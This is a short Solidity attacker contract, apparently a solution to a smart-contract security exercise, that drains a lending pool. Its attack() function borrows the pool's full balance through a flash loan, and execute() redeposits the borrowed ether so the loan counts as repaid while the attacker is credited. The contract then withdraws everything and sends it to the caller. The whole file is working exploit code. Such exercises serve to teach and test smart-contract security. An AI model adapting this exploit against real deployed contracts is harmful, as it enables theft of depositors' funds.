// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "contracts/Reenter/Reenter.sol";

contract ReentersBob{
    using Address for address payable;
    ReenterPool public pool;
    constructor(address _pool){
    pool = ReenterPool(_pool);
    }
 function attack() external{
    pool.flashLoan(address(pool).balance);
    pool.withdraw();
    payable(msg.sender).sendValue(address(this).balance);
 }
 function execute() external payable {
    pool.deposit{value: msg.value}();
 }

 receive() external payable{}
}
 